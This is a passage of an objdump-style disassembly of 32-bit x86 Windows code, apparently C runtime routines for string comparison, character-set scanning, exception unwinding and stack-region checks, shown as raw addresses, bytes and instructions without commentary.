  416efc:	3b 05 2c 68 45 00    	cmp    0x45682c,%eax
  416f02:	74 07                	je     0x416f0b
  416f04:	50                   	push   %eax
  416f05:	e8 c0 b2 ff ff       	call   0x4121ca
  416f0a:	59                   	pop    %ecx
  416f0b:	8b 76 24             	mov    0x24(%esi),%esi
  416f0e:	a1 3c 68 45 00       	mov    0x45683c,%eax
  416f13:	3b 70 24             	cmp    0x24(%eax),%esi
  416f16:	74 0f                	je     0x416f27
  416f18:	3b 35 30 68 45 00    	cmp    0x456830,%esi
  416f1e:	74 07                	je     0x416f27
  416f20:	56                   	push   %esi
  416f21:	e8 a4 b2 ff ff       	call   0x4121ca
  416f26:	59                   	pop    %ecx
  416f27:	5e                   	pop    %esi
  416f28:	c3                   	ret
  416f29:	cc                   	int3
  416f2a:	cc                   	int3
  416f2b:	cc                   	int3
  416f2c:	cc                   	int3
  416f2d:	cc                   	int3
  416f2e:	cc                   	int3
  416f2f:	cc                   	int3
  416f30:	55                   	push   %ebp
  416f31:	8b ec                	mov    %esp,%ebp
  416f33:	56                   	push   %esi
  416f34:	33 c0                	xor    %eax,%eax
  416f36:	50                   	push   %eax
  416f37:	50                   	push   %eax
  416f38:	50                   	push   %eax
  416f39:	50                   	push   %eax
  416f3a:	50                   	push   %eax
  416f3b:	50                   	push   %eax
  416f3c:	50                   	push   %eax
  416f3d:	50                   	push   %eax
  416f3e:	8b 55 0c             	mov    0xc(%ebp),%edx
  416f41:	8d 49 00             	lea    0x0(%ecx),%ecx
  416f44:	8a 02                	mov    (%edx),%al
  416f46:	0a c0                	or     %al,%al
  416f48:	74 09                	je     0x416f53
  416f4a:	83 c2 01             	add    $0x1,%edx
  416f4d:	0f ab 04 24          	bts    %eax,(%esp)
  416f51:	eb f1                	jmp    0x416f44
  416f53:	8b 75 08             	mov    0x8(%ebp),%esi
  416f56:	83 c9 ff             	or     $0xffffffff,%ecx
  416f59:	8d 49 00             	lea    0x0(%ecx),%ecx
  416f5c:	83 c1 01             	add    $0x1,%ecx
  416f5f:	8a 06                	mov    (%esi),%al
  416f61:	0a c0                	or     %al,%al
  416f63:	74 09                	je     0x416f6e
  416f65:	83 c6 01             	add    $0x1,%esi
  416f68:	0f a3 04 24          	bt     %eax,(%esp)
  416f6c:	73 ee                	jae    0x416f5c
  416f6e:	8b c1                	mov    %ecx,%eax
  416f70:	83 c4 20             	add    $0x20,%esp
  416f73:	5e                   	pop    %esi
  416f74:	c9                   	leave
  416f75:	c3                   	ret
  416f76:	cc                   	int3
  416f77:	cc                   	int3
  416f78:	cc                   	int3
  416f79:	cc                   	int3
  416f7a:	cc                   	int3
  416f7b:	cc                   	int3
  416f7c:	cc                   	int3
  416f7d:	cc                   	int3
  416f7e:	cc                   	int3
  416f7f:	cc                   	int3
  416f80:	8b 54 24 04          	mov    0x4(%esp),%edx
  416f84:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  416f88:	f7 c2 03 00 00 00    	test   $0x3,%edx
  416f8e:	75 3c                	jne    0x416fcc
  416f90:	8b 02                	mov    (%edx),%eax
  416f92:	3a 01                	cmp    (%ecx),%al
  416f94:	75 2e                	jne    0x416fc4
  416f96:	0a c0                	or     %al,%al
  416f98:	74 26                	je     0x416fc0
  416f9a:	3a 61 01             	cmp    0x1(%ecx),%ah
  416f9d:	75 25                	jne    0x416fc4
  416f9f:	0a e4                	or     %ah,%ah
  416fa1:	74 1d                	je     0x416fc0
  416fa3:	c1 e8 10             	shr    $0x10,%eax
  416fa6:	3a 41 02             	cmp    0x2(%ecx),%al
  416fa9:	75 19                	jne    0x416fc4
  416fab:	0a c0                	or     %al,%al
  416fad:	74 11                	je     0x416fc0
  416faf:	3a 61 03             	cmp    0x3(%ecx),%ah
  416fb2:	75 10                	jne    0x416fc4
  416fb4:	83 c1 04             	add    $0x4,%ecx
  416fb7:	83 c2 04             	add    $0x4,%edx
  416fba:	0a e4                	or     %ah,%ah
  416fbc:	75 d2                	jne    0x416f90
  416fbe:	8b ff                	mov    %edi,%edi
  416fc0:	33 c0                	xor    %eax,%eax
  416fc2:	c3                   	ret
  416fc3:	90                   	nop
  416fc4:	1b c0                	sbb    %eax,%eax
  416fc6:	d1 e0                	shl    %eax
  416fc8:	83 c0 01             	add    $0x1,%eax
  416fcb:	c3                   	ret
  416fcc:	f7 c2 01 00 00 00    	test   $0x1,%edx
  416fd2:	74 18                	je     0x416fec
  416fd4:	8a 02                	mov    (%edx),%al
  416fd6:	83 c2 01             	add    $0x1,%edx
  416fd9:	3a 01                	cmp    (%ecx),%al
  416fdb:	75 e7                	jne    0x416fc4
  416fdd:	83 c1 01             	add    $0x1,%ecx
  416fe0:	0a c0                	or     %al,%al
  416fe2:	74 dc                	je     0x416fc0
  416fe4:	f7 c2 02 00 00 00    	test   $0x2,%edx
  416fea:	74 a4                	je     0x416f90
  416fec:	66 8b 02             	mov    (%edx),%ax
  416fef:	83 c2 02             	add    $0x2,%edx
  416ff2:	3a 01                	cmp    (%ecx),%al
  416ff4:	75 ce                	jne    0x416fc4
  416ff6:	0a c0                	or     %al,%al
  416ff8:	74 c6                	je     0x416fc0
  416ffa:	3a 61 01             	cmp    0x1(%ecx),%ah
  416ffd:	75 c5                	jne    0x416fc4
  416fff:	0a e4                	or     %ah,%ah
  417001:	74 bd                	je     0x416fc0
  417003:	83 c1 02             	add    $0x2,%ecx
  417006:	eb 88                	jmp    0x416f90
  417008:	cc                   	int3
  417009:	cc                   	int3
  41700a:	cc                   	int3
  41700b:	cc                   	int3
  41700c:	cc                   	int3
  41700d:	cc                   	int3
  41700e:	cc                   	int3
  41700f:	cc                   	int3
  417010:	8b 44 24 0c          	mov    0xc(%esp),%eax
  417014:	85 c0                	test   %eax,%eax
  417016:	74 4a                	je     0x417062
  417018:	8b 54 24 04          	mov    0x4(%esp),%edx
  41701c:	56                   	push   %esi
  41701d:	57                   	push   %edi
  41701e:	8b f2                	mov    %edx,%esi
  417020:	8b 7c 24 10          	mov    0x10(%esp),%edi
  417024:	0b d7                	or     %edi,%edx
  417026:	83 e2 03             	and    $0x3,%edx
  417029:	74 38                	je     0x417063
  41702b:	a9 01 00 00 00       	test   $0x1,%eax
  417030:	74 11                	je     0x417043
  417032:	8a 0e                	mov    (%esi),%cl
  417034:	3a 0f                	cmp    (%edi),%cl
  417036:	75 58                	jne    0x417090
  417038:	83 c6 01             	add    $0x1,%esi
  41703b:	83 c7 01             	add    $0x1,%edi
  41703e:	83 e8 01             	sub    $0x1,%eax
  417041:	74 1d                	je     0x417060
  417043:	8a 0e                	mov    (%esi),%cl
  417045:	8a 17                	mov    (%edi),%dl
  417047:	38 d1                	cmp    %dl,%cl
  417049:	75 45                	jne    0x417090
  41704b:	8a 4e 01             	mov    0x1(%esi),%cl
  41704e:	8a 57 01             	mov    0x1(%edi),%dl
  417051:	38 d1                	cmp    %dl,%cl
  417053:	75 3b                	jne    0x417090
  417055:	83 c7 02             	add    $0x2,%edi
  417058:	83 c6 02             	add    $0x2,%esi
  41705b:	83 e8 02             	sub    $0x2,%eax
  41705e:	75 e3                	jne    0x417043
  417060:	5f                   	pop    %edi
  417061:	5e                   	pop    %esi
  417062:	c3                   	ret
  417063:	8b c8                	mov    %eax,%ecx
  417065:	83 e0 03             	and    $0x3,%eax
  417068:	c1 e9 02             	shr    $0x2,%ecx
  41706b:	74 2b                	je     0x417098
  41706d:	f3 a7                	repz cmpsl %es:(%edi),%ds:(%esi)
  41706f:	74 27                	je     0x417098
  417071:	8b 4e fc             	mov    -0x4(%esi),%ecx
  417074:	8b 57 fc             	mov    -0x4(%edi),%edx
  417077:	38 d1                	cmp    %dl,%cl
  417079:	75 10                	jne    0x41708b
  41707b:	38 f5                	cmp    %dh,%ch
  41707d:	75 0c                	jne    0x41708b
  41707f:	c1 e9 10             	shr    $0x10,%ecx
  417082:	c1 ea 10             	shr    $0x10,%edx
  417085:	38 d1                	cmp    %dl,%cl
  417087:	75 02                	jne    0x41708b
  417089:	38 f5                	cmp    %dh,%ch
  41708b:	b8 00 00 00 00       	mov    $0x0,%eax
  417090:	1b c0                	sbb    %eax,%eax
  417092:	5f                   	pop    %edi
  417093:	83 d8 ff             	sbb    $0xffffffff,%eax
  417096:	5e                   	pop    %esi
  417097:	c3                   	ret
  417098:	85 c0                	test   %eax,%eax
  41709a:	74 c4                	je     0x417060
  41709c:	8b 16                	mov    (%esi),%edx
  41709e:	8b 0f                	mov    (%edi),%ecx
  4170a0:	38 ca                	cmp    %cl,%dl
  4170a2:	75 e7                	jne    0x41708b
  4170a4:	83 e8 01             	sub    $0x1,%eax
  4170a7:	74 1c                	je     0x4170c5
  4170a9:	38 ee                	cmp    %ch,%dh
  4170ab:	75 de                	jne    0x41708b
  4170ad:	83 e8 01             	sub    $0x1,%eax
  4170b0:	74 13                	je     0x4170c5
  4170b2:	81 e1 00 00 ff 00    	and    $0xff0000,%ecx
  4170b8:	81 e2 00 00 ff 00    	and    $0xff0000,%edx
  4170be:	3b d1                	cmp    %ecx,%edx
  4170c0:	75 c9                	jne    0x41708b
  4170c2:	83 e8 01             	sub    $0x1,%eax
  4170c5:	5f                   	pop    %edi
  4170c6:	5e                   	pop    %esi
  4170c7:	c3                   	ret
  4170c8:	cc                   	int3
  4170c9:	cc                   	int3
  4170ca:	cc                   	int3
  4170cb:	cc                   	int3
  4170cc:	cc                   	int3
  4170cd:	cc                   	int3
  4170ce:	cc                   	int3
  4170cf:	cc                   	int3
  4170d0:	55                   	push   %ebp
  4170d1:	8b ec                	mov    %esp,%ebp
  4170d3:	57                   	push   %edi
  4170d4:	56                   	push   %esi
  4170d5:	53                   	push   %ebx
  4170d6:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4170d9:	e3 27                	jecxz  0x417102
  4170db:	8b d9                	mov    %ecx,%ebx
  4170dd:	8b 7d 08             	mov    0x8(%ebp),%edi
  4170e0:	8b f7                	mov    %edi,%esi
  4170e2:	33 c0                	xor    %eax,%eax
  4170e4:	f2 ae                	repnz scas %es:(%edi),%al
  4170e6:	f7 d9                	neg    %ecx
  4170e8:	03 cb                	add    %ebx,%ecx
  4170ea:	8b fe                	mov    %esi,%edi
  4170ec:	8b 75 0c             	mov    0xc(%ebp),%esi
  4170ef:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  4170f1:	8a 46 ff             	mov    -0x1(%esi),%al
  4170f4:	33 c9                	xor    %ecx,%ecx
  4170f6:	3a 47 ff             	cmp    -0x1(%edi),%al
  4170f9:	77 05                	ja     0x417100
  4170fb:	74 05                	je     0x417102
  4170fd:	83 e9 02             	sub    $0x2,%ecx
  417100:	f7 d1                	not    %ecx
  417102:	8b c1                	mov    %ecx,%eax
  417104:	5b                   	pop    %ebx
  417105:	5e                   	pop    %esi
  417106:	5f                   	pop    %edi
  417107:	c9                   	leave
  417108:	c3                   	ret
  417109:	cc                   	int3
  41710a:	cc                   	int3
  41710b:	cc                   	int3
  41710c:	cc                   	int3
  41710d:	cc                   	int3
  41710e:	cc                   	int3
  41710f:	cc                   	int3
  417110:	55                   	push   %ebp
  417111:	8b ec                	mov    %esp,%ebp
  417113:	56                   	push   %esi
  417114:	33 c0                	xor    %eax,%eax
  417116:	50                   	push   %eax
  417117:	50                   	push   %eax
  417118:	50                   	push   %eax
  417119:	50                   	push   %eax
  41711a:	50                   	push   %eax
  41711b:	50                   	push   %eax
  41711c:	50                   	push   %eax
  41711d:	50                   	push   %eax
  41711e:	8b 55 0c             	mov    0xc(%ebp),%edx
  417121:	8d 49 00             	lea    0x0(%ecx),%ecx
  417124:	8a 02                	mov    (%edx),%al
  417126:	0a c0                	or     %al,%al
  417128:	74 09                	je     0x417133
  41712a:	83 c2 01             	add    $0x1,%edx
  41712d:	0f ab 04 24          	bts    %eax,(%esp)
  417131:	eb f1                	jmp    0x417124
  417133:	8b 75 08             	mov    0x8(%ebp),%esi
  417136:	8b ff                	mov    %edi,%edi
  417138:	8a 06                	mov    (%esi),%al
  41713a:	0a c0                	or     %al,%al
  41713c:	74 0c                	je     0x41714a
  41713e:	83 c6 01             	add    $0x1,%esi
  417141:	0f a3 04 24          	bt     %eax,(%esp)
  417145:	73 f1                	jae    0x417138
  417147:	8d 46 ff             	lea    -0x1(%esi),%eax
  41714a:	83 c4 20             	add    $0x20,%esp
  41714d:	5e                   	pop    %esi
  41714e:	c9                   	leave
  41714f:	c3                   	ret
  417150:	55                   	push   %ebp
  417151:	8b ec                	mov    %esp,%ebp
  417153:	53                   	push   %ebx
  417154:	56                   	push   %esi
  417155:	57                   	push   %edi
  417156:	55                   	push   %ebp
  417157:	6a 00                	push   $0x0
  417159:	6a 00                	push   $0x0
  41715b:	68 68 71 41 00       	push   $0x417168
  417160:	ff 75 08             	push   0x8(%ebp)
  417163:	e8 86 09 00 00       	call   0x417aee
  417168:	5d                   	pop    %ebp
  417169:	5f                   	pop    %edi
  41716a:	5e                   	pop    %esi
  41716b:	5b                   	pop    %ebx
  41716c:	8b e5                	mov    %ebp,%esp
  41716e:	5d                   	pop    %ebp
  41716f:	c3                   	ret
  417170:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  417174:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  41717b:	b8 01 00 00 00       	mov    $0x1,%eax
  417180:	74 0f                	je     0x417191
  417182:	8b 44 24 08          	mov    0x8(%esp),%eax
  417186:	8b 54 24 10          	mov    0x10(%esp),%edx
  41718a:	89 02                	mov    %eax,(%edx)
  41718c:	b8 03 00 00 00       	mov    $0x3,%eax
  417191:	c3                   	ret
  417192:	53                   	push   %ebx
  417193:	56                   	push   %esi
  417194:	57                   	push   %edi
  417195:	8b 44 24 10          	mov    0x10(%esp),%eax
  417199:	50                   	push   %eax
  41719a:	6a fe                	push   $0xfffffffe
  41719c:	68 70 71 41 00       	push   $0x417170
  4171a1:	64 ff 35 00 00 00 00 	push   %fs:0x0
  4171a8:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4171af:	8b 44 24 20          	mov    0x20(%esp),%eax
  4171b3:	8b 58 08             	mov    0x8(%eax),%ebx
  4171b6:	8b 70 0c             	mov    0xc(%eax),%esi
  4171b9:	83 fe ff             	cmp    $0xffffffff,%esi
  4171bc:	74 2e                	je     0x4171ec
  4171be:	3b 74 24 24          	cmp    0x24(%esp),%esi
  4171c2:	74 28                	je     0x4171ec
  4171c4:	8d 34 76             	lea    (%esi,%esi,2),%esi
  4171c7:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  4171ca:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  4171ce:	89 48 0c             	mov    %ecx,0xc(%eax)
  4171d1:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  4171d6:	75 12                	jne    0x4171ea
  4171d8:	68 01 01 00 00       	push   $0x101
  4171dd:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  4171e1:	e8 40 00 00 00       	call   0x417226
  4171e6:	ff 54 b3 08          	call   *0x8(%ebx,%esi,4)
  4171ea:	eb c3                	jmp    0x4171af
  4171ec:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  4171f3:	83 c4 0c             	add    $0xc,%esp
  4171f6:	5f                   	pop    %edi
  4171f7:	5e                   	pop    %esi
  4171f8:	5b                   	pop    %ebx
  4171f9:	c3                   	ret
  4171fa:	33 c0                	xor    %eax,%eax
  4171fc:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  417203:	81 79 04 70 71 41 00 	cmpl   $0x417170,0x4(%ecx)
  41720a:	75 10                	jne    0x41721c
  41720c:	8b 51 0c             	mov    0xc(%ecx),%edx
  41720f:	8b 52 0c             	mov    0xc(%edx),%edx
  417212:	39 51 08             	cmp    %edx,0x8(%ecx)
  417215:	75 05                	jne    0x41721c
  417217:	b8 01 00 00 00       	mov    $0x1,%eax
  41721c:	c3                   	ret
  41721d:	53                   	push   %ebx
  41721e:	51                   	push   %ecx
  41721f:	bb 40 68 45 00       	mov    $0x456840,%ebx
  417224:	eb 0a                	jmp    0x417230
  417226:	53                   	push   %ebx
  417227:	51                   	push   %ecx
  417228:	bb 40 68 45 00       	mov    $0x456840,%ebx
  41722d:	8b 4d 08             	mov    0x8(%ebp),%ecx
  417230:	89 4b 08             	mov    %ecx,0x8(%ebx)
  417233:	89 43 04             	mov    %eax,0x4(%ebx)
  417236:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  417239:	59                   	pop    %ecx
  41723a:	5b                   	pop    %ebx
  41723b:	c2 04 00             	ret    $0x4
  41723e:	55                   	push   %ebp
  41723f:	8b ec                	mov    %esp,%ebp
  417241:	83 ec 0c             	sub    $0xc,%esp
  417244:	a1 10 62 45 00       	mov    0x456210,%eax
  417249:	33 45 04             	xor    0x4(%ebp),%eax
  41724c:	80 65 fa 00          	andb   $0x0,-0x6(%ebp)
  417250:	6a 06                	push   $0x6
  417252:	89 45 fc             	mov    %eax,-0x4(%ebp)
  417255:	8d 45 f4             	lea    -0xc(%ebp),%eax
  417258:	50                   	push   %eax
  417259:	68 04 10 00 00       	push   $0x1004
  41725e:	ff 75 08             	push   0x8(%ebp)
  417261:	ff 15 54 80 41 00    	call   *0x418054
  417267:	85 c0                	test   %eax,%eax
  417269:	75 05                	jne    0x417270
  41726b:	83 c8 ff             	or     $0xffffffff,%eax
  41726e:	eb 0a                	jmp    0x41727a
  417270:	8d 45 f4             	lea    -0xc(%ebp),%eax
  417273:	50                   	push   %eax
  417274:	e8 c5 05 00 00       	call   0x41783e
  417279:	59                   	pop    %ecx
  41727a:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  41727d:	33 4d 04             	xor    0x4(%ebp),%ecx
  417280:	e8 87 c9 ff ff       	call   0x413c0c
  417285:	c9                   	leave
  417286:	c3                   	ret
  417287:	6a 38                	push   $0x38
  417289:	68 88 8f 41 00       	push   $0x418f88
  41728e:	e8 81 bd ff ff       	call   0x413014
  417293:	a1 10 62 45 00       	mov    0x456210,%eax
  417298:	33 45 04             	xor    0x4(%ebp),%eax
  41729b:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  41729e:	33 ff                	xor    %edi,%edi
  4172a0:	89 7d e0             	mov    %edi,-0x20(%ebp)
  4172a3:	89 7d dc             	mov    %edi,-0x24(%ebp)
  4172a6:	8b 45 14             	mov    0x14(%ebp),%eax
  4172a9:	8b 18                	mov    (%eax),%ebx
  4172ab:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4172ae:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  4172b1:	8b 45 08             	mov    0x8(%ebp),%eax
  4172b4:	3b 45 0c             	cmp    0xc(%ebp),%eax
  4172b7:	0f 84 73 01 00 00    	je     0x417430
  4172bd:	8d 4d c0             	lea    -0x40(%ebp),%ecx
  4172c0:	51                   	push   %ecx
  4172c1:	50                   	push   %eax
  4172c2:	8b 35 00 81 41 00    	mov    0x418100,%esi
  4172c8:	ff d6                	call   *%esi
  4172ca:	85 c0                	test   %eax,%eax
  4172cc:	74 20                	je     0x4172ee
  4172ce:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  4172d2:	75 1a                	jne    0x4172ee
  4172d4:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4172d7:	50                   	push   %eax
  4172d8:	ff 75 0c             	push   0xc(%ebp)
  4172db:	ff d6                	call   *%esi
  4172dd:	85 c0                	test   %eax,%eax
  4172df:	74 0d                	je     0x4172ee
  4172e1:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  4172e5:	75 07                	jne    0x4172ee
  4172e7:	c7 45 d4 01 00 00 00 	movl   $0x1,-0x2c(%ebp)
  4172ee:	39 7d d4             	cmp    %edi,-0x2c(%ebp)
  4172f1:	74 1a                	je     0x41730d
  4172f3:	83 fb ff             	cmp    $0xffffffff,%ebx
  4172f6:	74 04                	je     0x4172fc
  4172f8:	8b f3                	mov    %ebx,%esi
  4172fa:	eb 0c                	jmp    0x417308
  4172fc:	ff 75 10             	push   0x10(%ebp)
  4172ff:	e8 ac c5 ff ff       	call   0x4138b0
  417304:	59                   	pop    %ecx
  417305:	8b f0                	mov    %eax,%esi
  417307:	46                   	inc    %esi
  417308:	89 75 bc             	mov    %esi,-0x44(%ebp)
  41730b:	eb 03                	jmp    0x417310
  41730d:	8b 75 bc             	mov    -0x44(%ebp),%esi
  417310:	39 7d d4             	cmp    %edi,-0x2c(%ebp)
  417313:	75 1a                	jne    0x41732f
  417315:	57                   	push   %edi
  417316:	57                   	push   %edi
  417317:	53                   	push   %ebx
  417318:	ff 75 10             	push   0x10(%ebp)
  41731b:	6a 01                	push   $0x1
  41731d:	ff 75 08             	push   0x8(%ebp)
  417320:	ff 15 74 80 41 00    	call   *0x418074
  417326:	8b f0                	mov    %eax,%esi
  417328:	89 75 bc             	mov    %esi,-0x44(%ebp)
  41732b:	3b f7                	cmp    %edi,%esi
  41732d:	74 58                	je     0x417387
  41732f:	89 7d fc             	mov    %edi,-0x4(%ebp)
  417332:	8d 04 36             	lea    (%esi,%esi,1),%eax
  417335:	83 c0 03             	add    $0x3,%eax
  417338:	83 e0 fc             	and    $0xfffffffc,%eax
  41733b:	e8 20 bd ff ff       	call   0x413060
  417340:	89 65 e8             	mov    %esp,-0x18(%ebp)
  417343:	8b dc                	mov    %esp,%ebx
  417345:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  417348:	8d 04 36             	lea    (%esi,%esi,1),%eax
  41734b:	50                   	push   %eax
  41734c:	57                   	push   %edi
  41734d:	53                   	push   %ebx
  41734e:	e8 cd c8 ff ff       	call   0x413c20
  417353:	83 c4 0c             	add    $0xc,%esp
  417356:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  41735a:	eb 17                	jmp    0x417373
  41735c:	33 c0                	xor    %eax,%eax
  41735e:	40                   	inc    %eax
  41735f:	c3                   	ret
  417360:	8b 65 e8             	mov    -0x18(%ebp),%esp
  417363:	e8 ee 00 00 00       	call   0x417456
  417368:	33 ff                	xor    %edi,%edi
  41736a:	33 db                	xor    %ebx,%ebx
  41736c:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  417370:	8b 75 bc             	mov    -0x44(%ebp),%esi
  417373:	3b df                	cmp    %edi,%ebx
  417375:	75 1e                	jne    0x417395
  417377:	56                   	push   %esi
  417378:	6a 02                	push   $0x2
  41737a:	e8 39 e3 ff ff       	call   0x4156b8
  41737f:	59                   	pop    %ecx
  417380:	59                   	pop    %ecx
  417381:	8b d8                	mov    %eax,%ebx
  417383:	3b df                	cmp    %edi,%ebx
  417385:	75 07                	jne    0x41738e
  417387:	33 c0                	xor    %eax,%eax
  417389:	e9 b4 00 00 00       	jmp    0x417442
  41738e:	c7 45 dc 01 00 00 00 	movl   $0x1,-0x24(%ebp)
  417395:	56                   	push   %esi
  417396:	53                   	push   %ebx
  417397:	ff 75 d8             	push   -0x28(%ebp)
  41739a:	ff 75 10             	push   0x10(%ebp)
  41739d:	6a 01                	push   $0x1
  41739f:	ff 75 08             	push   0x8(%ebp)
  4173a2:	ff 15 74 80 41 00    	call   *0x418074
  4173a8:	85 c0                	test   %eax,%eax
  4173aa:	0f 84 83 00 00 00    	je     0x417433
  4173b0:	39 7d 18             	cmp    %edi,0x18(%ebp)
  4173b3:	74 20                	je     0x4173d5
  4173b5:	57                   	push   %edi
  4173b6:	57                   	push   %edi
  4173b7:	ff 75 1c             	push   0x1c(%ebp)
  4173ba:	ff 75 18             	push   0x18(%ebp)
  4173bd:	56                   	push   %esi
  4173be:	53                   	push   %ebx
  4173bf:	57                   	push   %edi
  4173c0:	ff 75 0c             	push   0xc(%ebp)
  4173c3:	ff 15 b4 80 41 00    	call   *0x4180b4
  4173c9:	85 c0                	test   %eax,%eax
  4173cb:	74 66                	je     0x417433
  4173cd:	8b 45 18             	mov    0x18(%ebp),%eax
  4173d0:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4173d3:	eb 5e                	jmp    0x417433
  4173d5:	39 7d d4             	cmp    %edi,-0x2c(%ebp)
  4173d8:	75 16                	jne    0x4173f0
  4173da:	57                   	push   %edi
  4173db:	57                   	push   %edi
  4173dc:	57                   	push   %edi
  4173dd:	57                   	push   %edi
  4173de:	56                   	push   %esi
  4173df:	53                   	push   %ebx
  4173e0:	57                   	push   %edi
  4173e1:	ff 75 0c             	push   0xc(%ebp)
  4173e4:	ff 15 b4 80 41 00    	call   *0x4180b4
  4173ea:	8b f0                	mov    %eax,%esi
  4173ec:	3b f7                	cmp    %edi,%esi
  4173ee:	74 43                	je     0x417433
  4173f0:	56                   	push   %esi
  4173f1:	6a 01                	push   $0x1
  4173f3:	e8 c0 e2 ff ff       	call   0x4156b8
  4173f8:	59                   	pop    %ecx
  4173f9:	59                   	pop    %ecx
  4173fa:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4173fd:	3b c7                	cmp    %edi,%eax
  4173ff:	74 32                	je     0x417433
  417401:	57                   	push   %edi
  417402:	57                   	push   %edi
  417403:	56                   	push   %esi
  417404:	50                   	push   %eax
  417405:	56                   	push   %esi
  417406:	53                   	push   %ebx
  417407:	57                   	push   %edi
  417408:	ff 75 0c             	push   0xc(%ebp)
  41740b:	ff 15 b4 80 41 00    	call   *0x4180b4
  417411:	3b c7                	cmp    %edi,%eax
  417413:	75 0e                	jne    0x417423
  417415:	ff 75 e0             	push   -0x20(%ebp)
  417418:	e8 ad ad ff ff       	call   0x4121ca
  41741d:	59                   	pop    %ecx
  41741e:	89 7d e0             	mov    %edi,-0x20(%ebp)
  417421:	eb 10                	jmp    0x417433
  417423:	83 7d d8 ff          	cmpl   $0xffffffff,-0x28(%ebp)
  417427:	74 0a                	je     0x417433
  417429:	8b 4d 14             	mov    0x14(%ebp),%ecx
  41742c:	89 01                	mov    %eax,(%ecx)
  41742e:	eb 03                	jmp    0x417433
  417430:	8b 5d b8             	mov    -0x48(%ebp),%ebx
  417433:	39 7d dc             	cmp    %edi,-0x24(%ebp)
  417436:	74 07                	je     0x41743f
  417438:	53                   	push   %ebx
  417439:	e8 8c ad ff ff       	call   0x4121ca
  41743e:	59                   	pop    %ecx
  41743f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  417442:	8d 65 ac             	lea    -0x54(%ebp),%esp
  417445:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  417448:	33 4d 04             	xor    0x4(%ebp),%ecx
  41744b:	e8 bc c7 ff ff       	call   0x413c0c
  417450:	e8 fa bb ff ff       	call   0x41304f
  417455:	c3                   	ret
  417456:	55                   	push   %ebp
  417457:	8b ec                	mov    %esp,%ebp
  417459:	83 ec 48             	sub    $0x48,%esp
  41745c:	53                   	push   %ebx
  41745d:	56                   	push   %esi
  41745e:	57                   	push   %edi
  41745f:	6a 04                	push   $0x4
  417461:	58                   	pop    %eax
  417462:	e8 f9 bb ff ff       	call   0x413060
  417467:	8b dc                	mov    %esp,%ebx
  417469:	6a 1c                	push   $0x1c
  41746b:	8d 45 dc             	lea    -0x24(%ebp),%eax
  41746e:	50                   	push   %eax
  41746f:	53                   	push   %ebx
  417470:	ff 15 44 80 41 00    	call   *0x418044
  417476:	85 c0                	test   %eax,%eax
  417478:	74 71                	je     0x4174eb
  41747a:	8b 7d e0             	mov    -0x20(%ebp),%edi
  41747d:	8d 45 b8             	lea    -0x48(%ebp),%eax
  417480:	50                   	push   %eax
  417481:	ff 15 48 80 41 00    	call   *0x418048
  417487:	8b 45 bc             	mov    -0x44(%ebp),%eax
  41748a:	8d 70 ff             	lea    -0x1(%eax),%esi
  41748d:	f7 d6                	not    %esi
  41748f:	23 f3                	and    %ebx,%esi
  417491:	2b f0                	sub    %eax,%esi
  417493:	89 45 fc             	mov    %eax,-0x4(%ebp)
  417496:	a1 8c 6c 45 00       	mov    0x456c8c,%eax
  41749b:	8b c8                	mov    %eax,%ecx
  41749d:	49                   	dec    %ecx
  41749e:	f7 d9                	neg    %ecx
  4174a0:	1b c9                	sbb    %ecx,%ecx
  4174a2:	81 e1 00 10 ff ff    	and    $0xffff1000,%ecx
  4174a8:	81 c1 00 10 01 00    	add    $0x11000,%ecx
  4174ae:	03 cf                	add    %edi,%ecx
  4174b0:	3b f1                	cmp    %ecx,%esi
  4174b2:	72 37                	jb     0x4174eb
  4174b4:	83 f8 01             	cmp    $0x1,%eax
  4174b7:	74 4a                	je     0x417503
  4174b9:	8b df                	mov    %edi,%ebx
  4174bb:	bf 00 10 00 00       	mov    $0x1000,%edi
  4174c0:	6a 1c                	push   $0x1c
  4174c2:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4174c5:	50                   	push   %eax
  4174c6:	53                   	push   %ebx
  4174c7:	ff 15 44 80 41 00    	call   *0x418044
  4174cd:	85 c0                	test   %eax,%eax
  4174cf:	74 1a                	je     0x4174eb
  4174d1:	03 5d e8             	add    -0x18(%ebp),%ebx
  4174d4:	85 7d ec             	test   %edi,-0x14(%ebp)
  4174d7:	74 e7                	je     0x4174c0
  4174d9:	f6 45 f1 01          	testb  $0x1,-0xf(%ebp)
  4174dd:	8b 5d dc             	mov    -0x24(%ebp),%ebx
  4174e0:	74 05                	je     0x4174e7
  4174e2:	33 c0                	xor    %eax,%eax
  4174e4:	40                   	inc    %eax
  4174e5:	eb 38                	jmp    0x41751f
  4174e7:	3b f3                	cmp    %ebx,%esi
  4174e9:	73 04                	jae    0x4174ef
  4174eb:	33 c0                	xor    %eax,%eax
  4174ed:	eb 30                	jmp    0x41751f
  4174ef:	6a 04                	push   $0x4
  4174f1:	57                   	push   %edi
  4174f2:	ff 75 fc             	push   -0x4(%ebp)
  4174f5:	53                   	push   %ebx
  4174f6:	ff 15 14 80 41 00    	call   *0x418014
  4174fc:	a1 8c 6c 45 00       	mov    0x456c8c,%eax
